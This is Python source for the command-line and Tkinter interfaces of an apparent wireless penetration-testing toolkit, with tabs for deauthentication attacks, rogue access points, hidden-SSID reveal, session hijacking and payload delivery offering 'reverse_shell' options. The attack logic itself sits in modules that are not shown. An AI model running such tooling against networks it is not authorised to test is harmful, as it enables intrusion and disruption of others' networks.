        click.echo(f"No details found for interface '{selected_interface}'.")
        return

    # Convert details to DataFrame
    details_df = pd.DataFrame(details)

    click.echo(Fore.GREEN + f"\nInterface Details for '{selected_interface}':")
    click.echo(details_df.to_string(index=False))

@cli.command()
@click.pass_context
def finalize(ctx):
    """
    Finalize testing activities and generate reports.
    """
    core = ctx.obj['core']
    try:
        core.logger.info("Finalizing and generating reports.")
        core.finalize()
        click.echo("Reports generated successfully.")
    except Exception as e:
        core.logger.exception("Error during finalization")
        click.echo(f"Error during finalization: {e}")
        ctx.exit(1)


# ui/cli.py

...

if __name__ == '__main__':
    cli()


# ui/gui.py
# ui/gui.py

"""
WirelessPenTestLib GUI Module

This module defines the graphical user interface (GUI) for the WirelessPenTestLib application.
It leverages Tkinter to create a tabbed interface that includes various frames for different functionalities:
- Live Network Details
- Live Packet Monitor
- Fake Devices Manager
- Rogue Access Point Manager
- Scans
- Exploits
- Reports
- Settings

The GUI interacts with the CoreFramework to perform network scanning, exploitation, and reporting tasks.

** Important Note:**
Creating rogue access points and performing network penetration testing should only be done
with explicit permission on networks you own or have authorization to test. Unauthorized access
to networks is illegal and unethical.
"""

import sys
import os
import json
import threading
import queue
import re
from typing import Optional, Dict, Any, List

from ui.frames.anomaly_detector_frame import AnomalyDetectionFrame
from ui.frames.hidden_ssid_frame import HiddenSSIDFrame
from ui.frames.signal_heatmap_frame import SignalHeatmapFrame

# Add the parent directory to the system path to import core modules
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

import tkinter as tk
from tkinter import ttk, messagebox, filedialog
from core.__init__ import CoreFramework
from core.config.protocols import register_scanners, register_exploits
from ui.frames.live_network_frame import LiveNetworkFrame
from ui.frames.live_packet_monitor import LivePacketMonitor
from ui.frames.test_devices import FakeDeviceManager
from ui.frames.rogue_access_point import FakeAccessPoint
from ui.frames.network_graph_visualization import NetworkGraphVisualizationFrame
from ui.frames.report_generation_frame import ReportGenerationFrame
from ui.frames.beacon_analysis_frame import BeaconAnalysisFrame
from ui.frames.deauth_attack_frame import DeauthAttackFrame
from ui.frames.hidden_ssid_frame import HiddenSSIDFrame


def create_test_data() -> Dict[str, Any]:
    """
    Creates and returns test data for WEP and WPA networks.

    Returns:
        Dict[str, Any]: A dictionary containing test data for WEP and WPA networks.
    """
    return {
        "wpa_networks": {
            "00:11:22:33:44:55": {
                "SSID": "TestNetwork",
                "BSSID": "00:11:22:33:44:55",
                "Security": "WPA2",
                "WPS_Enabled": False
            }
        },
        "wep_networks": {
            "00:11:22:33:44:66": {
                "SSID": "TestNetwork",
                "BSSID": "00:11:22:33:44:66",
                "Security": "WEP",
                "Key_Strength": "Weak"
            }
        }
    }


class WirelessPenTestGUI(tk.Tk):
    """
    Main GUI class for the WirelessPenTestLib application.

    Inherits from Tkinter's Tk class and sets up a tabbed interface with various functionalities
    for network penetration testing, including live monitoring, fake device management, and rogue
    access point setup.

    Attributes:
        wep_networks (Optional[Dict[str, Any]]): Stores WEP network information.
        wpa_networks (Optional[Dict[str, Any]]): Stores WPA network information.
        core (Optional[CoreFramework]): Instance of the CoreFramework for backend operations.
        vulnerability_db (Any): Database of known vulnerabilities.
        stop_event (threading.Event): Event to signal threads to stop operations.
    """

    def __init__(self):
        """
        Initializes the WirelessPenTestGUI application.

        Sets up the main window, initializes the CoreFramework, and creates all necessary tabs.
        """
        super().__init__()
        self.wep_networks: Optional[Dict[str, Any]] = None
        self.wpa_networks: Optional[Dict[str, Any]] = None
        self.title("WirelessPenTestLib GUI")
        self.geometry("1200x800")  # Increased size for better usability

        # Initialize stop event to manage thread termination
        self.stop_event = threading.Event()

        # Initialize queues for thread-safe GUI updates
        self.scan_log_queue = queue.Queue()
        self.exploit_log_queue = queue.Queue()

        # Schedule periodic checks for log queues
        self.after(100, self.process_scan_log_queue)
        self.after(100, self.process_exploit_log_queue)

        # Initialize Core Framework
        self.core = self.initialize_coreframework()
        if not self.core:
            messagebox.showerror("Initialization Error", "Failed to initialize CoreFramework. Exiting.")
            self.destroy()
            return

        # Warning message for legal and ethical use
        messagebox.showwarning(
            "Legal and Ethical Use",
            "Ensure you have authorization to perform penetration testing on the target networks."
        )

        # Create a container frame to hold the Notebook (tabbed interface) and Stop button
        container_frame = ttk.Frame(self)
        container_frame.pack(fill=tk.BOTH, expand=True)

        # Create a Notebook (tabbed interface) inside the container frame
        self.notebook = ttk.Notebook(container_frame)
        self.notebook.pack(fill=tk.BOTH, expand=True, side='top')

        # Add Live Network Details tab
        self.live_network_frame = LiveNetworkFrame(
            parent=self.notebook,
            core_framework=self.core,
            scan_interval=30  # Scan every 30 seconds
        )
        self.notebook.add(self.live_network_frame, text="Live Network Details")

        # Load vulnerability database from CoreFramework
        self.vulnerability_db = self.core.vulnerability_db

        # Create additional tabs for various functionalities
        self.create_scan_tab()
        self.create_exploit_tab()
        self.create_report_tab()
        self.create_settings_tab()
        self.create_live_packet_monitor_tab()
        self.create_fake_devices_tab()
        self.create_rogue_access_point_tab()
        self.create_network_visualization_tab()
        self.create_report_generation_tab()
        self.create_hidden_ssid_tab()
        self.create_signal_heatmap_tab()
        self.create_anomaly_detection_tab()
        self.create_wireless_network_enumeration_tab()
        self.create_deauth_attack_tab()
        self.add_hidden_ssid_attack_frame_tab()

        # Add a Stop button at the bottom of the container frame to halt ongoing operations
        self.add_stop_button(container_frame)

        # Bind the protocol for window closing to ensure cleanup
        self.protocol("WM_DELETE_WINDOW", self.on_closing)

    def initialize_coreframework(self) -> Optional[CoreFramework]:
        """
        Initializes the CoreFramework with necessary configurations.

        Returns:
            Optional[CoreFramework]: An instance of CoreFramework if successful, else None.
        """
        # Define paths to configuration directories and vulnerability database
        current_dir = os.path.dirname(os.path.abspath(__file__))
        project_root = os.path.abspath(os.path.join(current_dir, '..'))
        protocols_path = os.path.join(project_root, 'core', 'config', 'protocols')
        config_dir = os.path.join(project_root, 'core', 'config')
        vulnerabilities_path = os.path.join(project_root, 'vulnerabilities', 'vulnerabilities.json')

        # Initialize CoreFramework
        try:
            core = CoreFramework(
                modules_path=protocols_path,
                config_dir=config_dir,
                scanners=register_scanners(),
                exploits=register_exploits(),
                vulnerabilities_path=vulnerabilities_path
            )
            core.logger.info("CoreFramework initialized successfully.")
            return core
        except FileNotFoundError as e:
            messagebox.showerror("Initialization Error", f"Configuration file not found: {e}")
        except json.JSONDecodeError as e:
            messagebox.showerror("Initialization Error", f"Invalid configuration format: {e}")
        except Exception as e:
            messagebox.showerror("Initialization Error", f"An unexpected error occurred: {e}")
        return None

    def create_hidden_ssid_tab(self):
        self.hidden_ssid_frame = HiddenSSIDFrame(self.notebook, self.core)
        self.notebook.add(self.hidden_ssid_frame, text='Hidden SSID Reveal')

    def enter_fake_data(self):
        """
        Inserts fake test data into the LiveNetworkFrame for testing purposes.
        """
        test_data = create_test_data()
        self.wpa_networks = test_data["wpa_networks"]
        self.wep_networks = test_data["wep_networks"]
        self.live_network_frame.update_gui(test_data)

    def run_gui_as_test(self):
        """
        Populates the GUI with fake data and starts the main loop.

        Useful for testing the GUI without connecting to real networks.
        """
        self.enter_fake_data()
        self.mainloop()

    def create_scan_tab(self) -> None:
        """
        Creates the 'Scans' tab in the Notebook.
        """
        self.scans_tab = ScansTab(self.notebook, self.core, self.stop_event, self.scan_log_queue)
        self.notebook.add(self.scans_tab, text='Scans')

    def create_report_generation_tab(self):
        self.report_generation_frame = ReportGenerationFrame(self.notebook, self.core)
        self.notebook.add(self.report_generation_frame, text='Report Generation')

    def create_deauth_attack_tab(self):
        self.deauth_attack_frame = DeauthAttackFrame(self.notebook, self.core)
        self.notebook.add(self.deauth_attack_frame, text='Deauth Attack')

    def add_stop_button(self, parent: ttk.Frame) -> None:
        """
        Adds a Stop button at the bottom of the GUI to halt ongoing operations.

        Args:
            parent (ttk.Frame): The parent frame to attach the button.
        """
        stop_button = ttk.Button(parent, text="Stop", command=self.stop_operations)
        stop_button.pack(pady=10, side='bottom')

    def create_wireless_network_enumeration_tab(self):
        self.beacon_analysis_frame = BeaconAnalysisFrame(self.notebook, self.core)
        self.notebook.add(self.beacon_analysis_frame, text='Beacon Analysis')

    def add_hidden_ssid_attack_frame_tab(self):
        """

        :return:
        """
        self.hidden_ssid_frame = HiddenSSIDFrame(self.notebook, self.core)
        self.notebook.add(self.hidden_ssid_frame, text='Hidden SSID')

    def stop_operations(self) -> None:
        """
        Handles the Stop button click event.

        Signals all running operations (scans and exploits) to terminate gracefully.
        """
        if not self.stop_event.is_set():
            self.stop_event.set()
            self.scan_log_queue.put("Stopping operations...")
            self.exploit_log_queue.put("Stopping operations...")

            # Wait for threads to finish
            if hasattr(self, 'scan_thread') and self.scan_thread.is_alive():
                self.scan_thread.join(timeout=5)
            if hasattr(self, 'exploit_thread') and self.exploit_thread.is_alive():
                self.exploit_thread.join(timeout=5)

            self.scan_log_queue.put("Operations stopped.")
            self.exploit_log_queue.put("Operations stopped.")
        else:
            self.scan_log_queue.put("No ongoing operations to stop.")
            self.exploit_log_queue.put("No ongoing operations to stop.")

    def process_scan_log_queue(self) -> None:
        """
        Processes the scan log queue and updates the scan log text widget.
        """
        while not self.scan_log_queue.empty():
            message = self.scan_log_queue.get_nowait()
            self.scans_tab.log_message(self.scans_tab.scan_log, message)
        self.after(100, self.process_scan_log_queue)

    def process_exploit_log_queue(self) -> None:
        """
        Processes the exploit log queue and updates the exploit log text widget.
        """
        while not self.exploit_log_queue.empty():
            message = self.exploit_log_queue.get_nowait()
            self.exploits_tab.log_message(self.exploits_tab.exploit_log, message)
        self.after(100, self.process_exploit_log_queue)

    def create_exploit_tab(self) -> None:
        """
        Creates the 'Exploits' tab in the Notebook.
        """
        self.exploits_tab = ExploitsTab(self.notebook, self.core, self.stop_event, self.exploit_log_queue)
        self.notebook.add(self.exploits_tab, text='Exploits')

    def create_signal_heatmap_tab(self):
        self.signal_heatmap_frame = SignalHeatmapFrame(self.notebook, self.core)
        self.notebook.add(self.signal_heatmap_frame, text='Signal Heatmap')

    def create_report_tab(self) -> None:
        """
        Creates the 'Reports' tab in the Notebook.
        """
        self.reports_tab = ReportsTab(self.notebook, self.core)
        self.notebook.add(self.reports_tab, text='Reports')

    def create_settings_tab(self) -> None:
        """
        Creates the 'Settings' tab in the Notebook.
        """
        self.settings_tab = SettingsTab(self.notebook)
        self.notebook.add(self.settings_tab, text='Settings')

    def create_live_packet_monitor_tab(self) -> None:
        """
        Creates the 'Live Packet Monitor' tab in the Notebook.
        """
        live_packet_monitor = LivePacketMonitor(self.notebook)
        self.notebook.add(live_packet_monitor, text="Live Packet Monitor")

    def create_fake_devices_tab(self) -> None:
        """
        Creates the 'Fake Devices' tab in the Notebook.
        """
        fake_devices_frame = FakeDeviceManager(self.notebook)
        self.notebook.add(fake_devices_frame, text="Fake Devices")

    def create_rogue_access_point_tab(self) -> None:
        """
        Creates the 'Rogue Access Point' tab in the Notebook.
        """
        rogue_access_point_frame = FakeAccessPoint(self.notebook)
        self.notebook.add(rogue_access_point_frame, text="Rogue Access Point")

    def create_network_visualization_tab(self) -> None:
        """
        Creates the 'Network Visualization' tab in the Notebook.
        """
        network_graph_frame = NetworkGraphVisualizationFrame(self.notebook)
        self.notebook.add(network_graph_frame, text="Network Visualization")

    def create_anomaly_detection_tab(self) -> None:
        """
        Creates the 'Anomaly Detection' tab in the Notebook.
        """
        anomaly_detection_frame = AnomalyDetectionFrame(self.notebook, self.core)
        self.notebook.add(anomaly_detection_frame, text="Anomaly Detection")

    def stop_operations(self) -> None:
        """
        Handles the Stop button click event.

        Signals all running operations to terminate gracefully.
        """
        if not self.core.stop_event.is_set():
            self.core.stop_all_operations()
            messagebox.showinfo("Operations Stopped", "All ongoing operations have been stopped.")
        else:
            messagebox.showinfo("No Ongoing Operations", "There are no ongoing operations to stop.")

    def on_closing(self) -> None:
        """
        Handles the window closing event to ensure proper cleanup.
        """
        if messagebox.askokcancel("Quit", "Do you want to quit?"):
            self.stop_operations()
            self.destroy()


class ScansTab(ttk.Frame):
    def __init__(self, parent: ttk.Notebook, core_framework: CoreFramework, stop_event: threading.Event,
                 log_queue: queue.Queue):
        super().__init__(parent)
        self.core = core_framework
        self.stop_event = stop_event
        self.log_queue = log_queue
        self.create_widgets()

    def create_widgets(self) -> None:
        """
        Creates the widgets for the 'Scans' tab.
        """
        # Scanner Selection Section
        scanner_label = ttk.Label(self, text="Select Scanners:")
        scanner_label.pack(pady=5)

        self.scanner_vars: Dict[str, tk.BooleanVar] = {}
        for sc in self.core.scanners.keys():
            var = tk.BooleanVar()
            chk = ttk.Checkbutton(self, text=sc, variable=var)
            chk.pack(anchor='w', padx=20)
            self.scanner_vars[sc] = var

        # Target Selection Section
        target_frame = ttk.LabelFrame(self, text="Target Network")
        target_frame.pack(padx=10, pady=10, fill='x')

        ssid_label = ttk.Label(target_frame, text="SSID:")
        ssid_label.grid(row=0, column=0, padx=5, pady=5, sticky='e')
        self.scan_ssid_entry = ttk.Entry(target_frame, width=50)
        self.scan_ssid_entry.grid(row=0, column=1, padx=5, pady=5)

        bssid_label = ttk.Label(target_frame, text="BSSID:")
        bssid_label.grid(row=1, column=0, padx=5, pady=5, sticky='e')
        self.scan_bssid_entry = ttk.Entry(target_frame, width=50)
        self.scan_bssid_entry.grid(row=1, column=1, padx=5, pady=5)

        # Scan and Finalize Buttons
        scan_button = ttk.Button(self, text="Run Scans", command=self.run_scans)
        scan_button.pack(pady=10)

        finalize_button = ttk.Button(self, text="Finalize and Generate Reports",
                                     command=self.finalize_and_generate_reports)
        finalize_button.pack(pady=10)

        # Log Area for Scans
        self.scan_log = tk.Text(self, height=15, state='disabled')
        self.scan_log.pack(padx=10, pady=10, fill='both', expand=True)

    def run_scans(self) -> None:
        """
        Initiates the scanning process based on selected scanners and target network.

        Validates user inputs and starts a separate thread to perform scans to keep the GUI responsive.
        """
        selected_scanners = [sc for sc, var in self.scanner_vars.items() if var.get()]
        ssid = self.scan_ssid_entry.get().strip()
        bssid = self.scan_bssid_entry.get().strip()

        # Input validation
        if not selected_scanners:
            messagebox.showwarning("No Scanners Selected", "Please select at least one scanner.")
            return
        if not ssid or not bssid:
            messagebox.showwarning("Incomplete Target Information", "Please provide both SSID and BSSID.")
            return
        if not self.is_valid_bssid(bssid):
            messagebox.showwarning("Invalid BSSID", "Please provide a valid BSSID (MAC address).")
            return

        target = {'ssid': ssid, 'bssid': bssid}

        # Reset stop_event before starting new scans
        if self.stop_event.is_set():
            self.stop_event.clear()

        # Start scanning in a separate thread
        self.scan_thread = threading.Thread(target=self.execute_scans, args=(selected_scanners, target), daemon=True)
        self.scan_thread.start()

    def finalize_and_generate_reports(self) -> None:
        """
        Finalizes the scanning process and generates reports.

        Initiates a separate thread to handle finalization to keep the GUI responsive.
        """
        threading.Thread(target=self.execute_finalize, daemon=True).start()

    def execute_finalize(self) -> None:
        """
        Executes the finalization and report generation process.

        Handles any exceptions and updates the report log accordingly.
        """
        try:
            self.core.finalize()
            self.log_queue.put("Reports generated successfully.\n")
            messagebox.showinfo("Finalize Complete", "Reports generated successfully.")
        except Exception as e:
            messagebox.showerror("Finalize Error", f"Failed to finalize and generate reports: {e}")

    def execute_scans(self, scanners: List[str], target: Dict[str, str]) -> None:
        """
        Executes the selected scanners against the target network.

        Args:
            scanners (list): List of scanner names to run.
            target (Dict[str, str]): Dictionary containing target SSID and BSSID.
        """
        for sc in scanners:
            if self.stop_event.is_set():
                self.log_queue.put("Scan operation interrupted by user.")
                break
            self.log_queue.put(f"Running scanner: {sc}")
            try:
                # Pass the stop_event to the scanner's scan method if possible
                scan_result = self.core.run_scanner(sc, target, self.stop_event)
                self.log_queue.put(f"Scanner '{sc}' completed.\n")

                # Optionally, display scan results in the log
                for device in scan_result.get("devices", []):
                    device_info = (f"IP: {device.get('ip', 'N/A')}, "
                                   f"MAC: {device.get('mac', 'N/A')}, "
                                   f"Hostname: {device.get('hostname', 'N/A')}, "
                                   f"SSID: {device.get('ssid', 'N/A')}, "
                                   f"BSSID: {device.get('bssid', 'N/A')}")
                    self.log_queue.put(f"Discovered Device: {device_info}")
            except Exception as e:
                self.log_queue.put(f"Error running scanner '{sc}': {e}\n")

    def log_message(self, log_widget: tk.Text, message: str) -> None:
        """
        Logs messages to the specified log widget.

        Args:
            log_widget (tk.Text): The text widget to log messages to.
            message (str): The message to log.
        """
        log_widget.config(state='normal')
        log_widget.insert(tk.END, message + '\n')
        log_widget.see(tk.END)
        log_widget.config(state='disabled')

    @staticmethod
    def is_valid_bssid(bssid: str) -> bool:
        """
        Validates the BSSID (MAC address) format.

        Args:
            bssid (str): The BSSID to validate.

        Returns:
            bool: True if valid, False otherwise.
        """
        pattern = re.compile(r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$')
        return bool(pattern.match(bssid))


class ExploitsTab(ttk.Frame):
    def __init__(self, parent: ttk.Notebook, core_framework: CoreFramework, stop_event: threading.Event,
                 log_queue: queue.Queue):
        super().__init__(parent)
        self.core = core_framework
        self.stop_event = stop_event
        self.log_queue = log_queue
        self.create_widgets()

    def create_widgets(self) -> None:
        """
        Creates the widgets for the 'Exploits' tab.
        """
        # Exploit Selection Section
        exploit_label = ttk.Label(self, text="Select Exploits:")
        exploit_label.pack(pady=5)

        self.exploit_vars: Dict[str, tk.BooleanVar] = {}
        for ex in self.core.exploits.keys():
            var = tk.BooleanVar()
            chk = ttk.Checkbutton(self, text=ex, variable=var)
            chk.pack(anchor='w', padx=20)
            self.exploit_vars[ex] = var

        # Target Selection Section
        target_frame = ttk.LabelFrame(self, text="Target Network")
        target_frame.pack(padx=10, pady=10, fill='x')

        ssid_label = ttk.Label(target_frame, text="SSID:")
        ssid_label.grid(row=0, column=0, padx=5, pady=5, sticky='e')
        self.exploit_ssid_entry = ttk.Entry(target_frame, width=50)
        self.exploit_ssid_entry.grid(row=0, column=1, padx=5, pady=5)

        bssid_label = ttk.Label(target_frame, text="BSSID:")
        bssid_label.grid(row=1, column=0, padx=5, pady=5, sticky='e')
        self.exploit_bssid_entry = ttk.Entry(target_frame, width=50)
        self.exploit_bssid_entry.grid(row=1, column=1, padx=5, pady=5)

        # Exploit-specific Parameters Section
        params_frame = ttk.LabelFrame(self, text="Exploit Parameters")
        params_frame.pack(padx=10, pady=10, fill='x')

        # Session Hijacking Parameters
        ip_label = ttk.Label(params_frame, text="Target IP (for Session Hijacking):")
        ip_label.grid(row=0, column=0, padx=5, pady=5, sticky='e')
        self.exploit_ip_entry = ttk.Entry(params_frame, width=50)
        self.exploit_ip_entry.grid(row=0, column=1, padx=5, pady=5)

        mac_label = ttk.Label(params_frame, text="Target MAC Address:")
        mac_label.grid(row=1, column=0, padx=5, pady=5, sticky='e')
        self.exploit_mac_entry = ttk.Entry(params_frame, width=50)
        self.exploit_mac_entry.grid(row=1, column=1, padx=5, pady=5)

        gateway_ip_label = ttk.Label(params_frame, text="Gateway IP:")
        gateway_ip_label.grid(row=2, column=0, padx=5, pady=5, sticky='e')
        self.exploit_gateway_ip_entry = ttk.Entry(params_frame, width=50)
        self.exploit_gateway_ip_entry.grid(row=2, column=1, padx=5, pady=5)

        gateway_mac_label = ttk.Label(params_frame, text="Gateway MAC Address:")
        gateway_mac_label.grid(row=3, column=0, padx=5, pady=5, sticky='e')
        self.exploit_gateway_mac_entry = ttk.Entry(params_frame, width=50)
        self.exploit_gateway_mac_entry.grid(row=3, column=1, padx=5, pady=5)

        # Payload Type Selection (for Payload Delivery)
        payload_label = ttk.Label(params_frame, text="Payload Type (for Payload Delivery):")
        payload_label.grid(row=4, column=0, padx=5, pady=5, sticky='e')
        self.payload_type_var = tk.StringVar()
        self.payload_type_combo = ttk.Combobox(params_frame, textvariable=self.payload_type_var, state='readonly')
        self.payload_type_combo['values'] = ['reverse_shell', 'malicious_script']
        self.payload_type_combo.grid(row=4, column=1, padx=5, pady=5)
        self.payload_type_combo.current(0)

        # Exploit Execution Button
        exploit_button = ttk.Button(self, text="Run Exploits", command=self.run_exploits)
        exploit_button.pack(pady=10)

        # Log Area for Exploits
        self.exploit_log = tk.Text(self, height=15, state='disabled')
        self.exploit_log.pack(padx=10, pady=10, fill='both', expand=True)

    def run_exploits(self) -> None:
        """
        Initiates the exploitation process based on selected exploits and target information.

        Validates user inputs and starts a separate thread to perform exploits to keep the GUI responsive.
        """
        selected_exploits = [ex for ex, var in self.exploit_vars.items() if var.get()]
        ssid = self.exploit_ssid_entry.get().strip()
        bssid = self.exploit_bssid_entry.get().strip()

        # Input validation
        if not selected_exploits:
            messagebox.showwarning("No Exploits Selected", "Please select at least one exploit.")
            return
        if not ssid or not bssid:
            messagebox.showwarning("Incomplete Target Information", "Please provide both SSID and BSSID.")
            return
        if not self.is_valid_bssid(bssid):
            messagebox.showwarning("Invalid BSSID", "Please provide a valid BSSID (MAC address).")
            return

        # Gather exploit-specific parameters
        target_session = {
            'target_ip': self.exploit_ip_entry.get().strip(),
            'target_mac': self.exploit_mac_entry.get().strip(),
            'gateway_ip': self.exploit_gateway_ip_entry.get().strip(),
            'gateway_mac': self.exploit_gateway_mac_entry.get().strip()
        }
        payload_type = self.payload_type_var.get()
        duration = 10  # Default duration; can be enhanced to allow user input

        # Define the target network details
        target = {
            'ssid': ssid,
            'bssid': bssid
        }

        # Reset stop_event before starting new exploits
        if self.stop_event.is_set():
            self.stop_event.clear()

        # Start exploitation in a separate thread
        self.exploit_thread = threading.Thread(
            target=self.execute_exploits,
            args=(selected_exploits, target, target_session, payload_type, duration),
            daemon=True
        )
        self.exploit_thread.start()

    def execute_exploits(self, exploits: List[str], target: Dict[str, str],
                         target_session: Dict[str, str], payload_type: str, duration: int) -> None:
        """
        Executes the selected exploits against the target network.

        Args:
            exploits (list): List of exploit names to run.
            target (Dict[str, str]): Target network details (SSID and BSSID).
            target_session (Dict[str, str]): Session hijacking parameters.
            payload_type (str): Type of payload for payload delivery exploits.
            duration (int): Duration for which the exploit should run.
        """
        for ex in exploits:
            if self.stop_event.is_set():
                self.log_queue.put("Exploit operation interrupted by user.")
                break
            self.log_queue.put(f"Running exploit: {ex}")
            vuln = self.core.vulnerability_db.get(ex, {})

            # Customize exploit parameters based on exploit type
            if ex == 'session_hijacking':
                vuln['target_session'] = target_session
            elif ex == 'payload_delivery':
                vuln['payload_type'] = payload_type
                vuln['duration'] = duration

            try:
                # Execute the exploit via CoreFramework
                self.core.run_exploit(ex, vuln, self.stop_event)
                self.log_queue.put(f"Exploit '{ex}' completed.\n")
            except Exception as e:
                self.log_queue.put(f"Error running exploit '{ex}': {e}\n")

    def log_message(self, log_widget: tk.Text, message: str) -> None:
        """
        Logs messages to the specified log widget.

        Args:
            log_widget (tk.Text): The text widget to log messages to.
            message (str): The message to log.
        """
        log_widget.config(state='normal')
        log_widget.insert(tk.END, message + '\n')
        log_widget.see(tk.END)
        log_widget.config(state='disabled')

    @staticmethod
    def is_valid_bssid(bssid: str) -> bool:
        """
        Validates the BSSID (MAC address) format.

        Args:
            bssid (str): The BSSID to validate.

        Returns:
            bool: True if valid, False otherwise.
        """
        pattern = re.compile(r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$')
        return bool(pattern.match(bssid))


class ReportsTab(ttk.Frame):
    def __init__(self, parent: ttk.Notebook, core_framework: CoreFramework):
        super().__init__(parent)
        self.core = core_framework
        self.create_widgets()

    def create_widgets(self) -> None:
        """
        Creates the widgets for the 'Reports' tab.
        """
        # Report Display Area
        self.report_text = tk.Text(self, height=25, state='disabled')
        self.report_text.pack(padx=10, pady=10, fill='both', expand=True)

        # Export Report Button
        export_button = ttk.Button(self, text="Export Report", command=self.export_report)
        export_button.pack(pady=5)

    def export_report(self) -> None:
        """
        Exports the generated reports to a file.

        Allows the user to choose the format (TXT or JSON) and the destination file.
        """
        # Prompt user to choose export format and location
        export_format = tk.StringVar(value='txt')
        format_window = tk.Toplevel(self)
        format_window.title("Select Export Format")
        ttk.Label(format_window, text="Choose Report Format:").pack(padx=10, pady=10)
        format_combo = ttk.Combobox(format_window, textvariable=export_format, state='readonly')
        format_combo['values'] = ['txt', 'json']
        format_combo.pack(padx=10, pady=5)
        format_combo.current(0)

        def confirm_export():
            selected_format = export_format.get()
            if selected_format == 'txt':
                file_path = filedialog.asksaveasfilename(defaultextension=".txt",
                                                         filetypes=[("Text Files", "*.txt"), ("All files", "*.*")])
                if file_path:
                    try:
                        with open(file_path, 'w') as f:
                            f.write(self.report_text.get(1.0, tk.END))
                        messagebox.showinfo("Export Successful", f"Report exported to {file_path}")
                    except Exception as e:
                        messagebox.showerror("Export Error", f"Failed to export report: {e}")
            elif selected_format == 'json':
                file_path = filedialog.asksaveasfilename(defaultextension=".json",
                                                         filetypes=[("JSON Files", "*.json"), ("All files", "*.*")])
                if file_path:
                    # Collect report data from scanners and exploits
                    report_data = {
                        'scans': [],
                        'exploits': []
                    }
                    for sc_name, scanner in self.core.scanners.items():
                        if hasattr(scanner, 'detected_vulnerabilities') and scanner.detected_vulnerabilities:
                            report_data['scans'].append({
                                'scanner': sc_name,
                                'vulnerabilities': scanner.detected_vulnerabilities
                            })
                    for ex_name, exploit in self.core.exploits.items():
                        if hasattr(exploit, 'detected_vulnerabilities') and exploit.detected_vulnerabilities:
                            report_data['exploits'].append({
                                'exploit': ex_name,
                                'vulnerabilities': exploit.detected_vulnerabilities
                            })
                    try:
                        with open(file_path, 'w') as f:
                            json.dump(report_data, f, indent=4)
                        messagebox.showinfo("Export Successful", f"Report exported to {file_path}")
                    except Exception as e:
                        messagebox.showerror("Export Error", f"Failed to export report: {e}")
            format_window.destroy()

        ttk.Button(format_window, text="Export", command=confirm_export).pack(pady=10)


class SettingsTab(ttk.Frame):
    def __init__(self, parent: ttk.Notebook):
        super().__init__(parent)
        self.create_widgets()

    def create_widgets(self) -> None:
        """
        Creates the widgets for the 'Settings' tab.
        """
        # Configuration Settings Label
        config_label = ttk.Label(self, text="Configuration Settings:")
        config_label.pack(pady=5)

        # Configuration Display Area
        self.config_text = tk.Text(self, height=20, state='disabled')
        self.config_text.pack(padx=10, pady=10, fill='both', expand=True)

        # Refresh Configuration Button
        refresh_button = ttk.Button(self, text="Refresh Configuration", command=self.load_configuration)
        refresh_button.pack(pady=5)

        # Load and Display Current Configuration
        self.load_configuration()

    def load_configuration(self) -> None:
        """
        Loads and displays the current configuration settings from the vulnerabilities database.
        """
        current_dir = os.path.dirname(os.path.abspath(__file__))
        project_root = os.path.abspath(os.path.join(current_dir, '..'))
        config_path = os.path.join(project_root, 'vulnerabilities', 'vulnerabilities.json')

        if os.path.exists(config_path):
            try:
                with open(config_path, 'r') as f:
                    config = json.load(f)
                self.config_text.config(state='normal')
                self.config_text.delete(1.0, tk.END)
                for key, value in config.items():
                    self.config_text.insert(tk.END, f"{key}: {value}\n")
                self.config_text.config(state='disabled')
            except Exception as e:
                messagebox.showerror("Configuration Error", f"Failed to load configuration: {e}")
                self.config_text.config(state='normal')
                self.config_text.delete(1.0, tk.END)
                self.config_text.insert(tk.END, "Error loading configuration.")
                self.config_text.config(state='disabled')
        else:
            self.config_text.config(state='normal')
            self.config_text.delete(1.0, tk.END)
            self.config_text.insert(tk.END, "No configuration found.")
            self.config_text.config(state='disabled')


def main():
    """
    Entry point for the WirelessPenTestLib GUI application.

    Ensures the script is run with proper permissions and initializes the GUI.
    """
    # Initialize and run the GUI application
    app = WirelessPenTestGUI()
    app.mainloop()


if __name__ == "__main__":
    main()


# ui/interactive_cli.py
import cmd
import logging
import sys
import os
from core import CoreFramework  # Replace with the actual import path for CoreFramework

class WirelessPenTestConsole(cmd.Cmd):
    intro = "Welcome to WirelessPenTest Console. Type 'help' or '?' to list commands.\n"
    prompt = "WirelessPenTest> "

    def __init__(self):
        super().__init__()
        self.core = None
        self.logger = logging.getLogger(self.__class__.__name__)
        self.logger.setLevel(logging.DEBUG)

        # Set up logging handlers
        ch = logging.StreamHandler()
        ch.setLevel(logging.INFO)
        formatter = logging.Formatter('[%(asctime)s] %(levelname)s - %(message)s')
        ch.setFormatter(formatter)
        self.logger.addHandler(ch)

        # print cwd
        print(f"Current Working Directory: {os.getcwd()}")

        try:
            self.logger.info("Initializing CoreFramework...")
            self.core = CoreFramework(
                modules_path='../core/config/protocols',
                config_dir="../config",
                vulnerabilities_path="../core/vulnerabilities/vulnerabilities.json",
            )
            self.logger.info("CoreFramework initialized successfully.")
        except Exception as e:
            self.logger.error(f"Failed to initialize CoreFramework: {e}")
            sys.exit(1)

    def do_scan(self, arg):
        """
        Execute a scan on the target network.
        Usage: scan <interface>
        """
        args = arg.split()
        if len(args) != 1:
            print("Usage: scan <interface>")
            return
        interface = args[0]
        print(f"Running scan on interface: {interface}")
        try:
            results = self.core.run_local_scan(interface)
            for device in results.get("devices", []):
                print(f"Device: {device}")
        except Exception as e:
            print(f"Error during scan: {e}")

    def do_exploit(self, arg):
        """
        Run an exploit against a discovered vulnerability.
        Usage: exploit <exploit_name>
        """
        args = arg.split()
        if len(args) != 1:
            print("Usage: exploit <exploit_name>")
            return
        exploit_name = args[0]
        print(f"Running exploit: {exploit_name}")
        try:
            results = self.core.run_exploit(exploit_name)
            print(f"Exploit results: {results}")
        except Exception as e:
            print(f"Error during exploit: {e}")

    def do_list(self, arg):
        """
        List available tools (scanners, exploits, etc.).
        Usage: list
        """
        print("\nAvailable Scanners:")
        for scanner in self.core.scanners.keys():
            print(f"  - {scanner}")
        print("\nAvailable Exploits:")
        for exploit in self.core.exploits.keys():
            print(f"  - {exploit}")

    def do_configure(self, arg):
        """
        Configure library settings.
        Usage: configure <key> <value>
        """
        args = arg.split()
        if len(args) != 2:
            print("Usage: configure <key> <value>")
            return
        key, value = args
        try:
            self.core.config_manager.set_config(key, value)
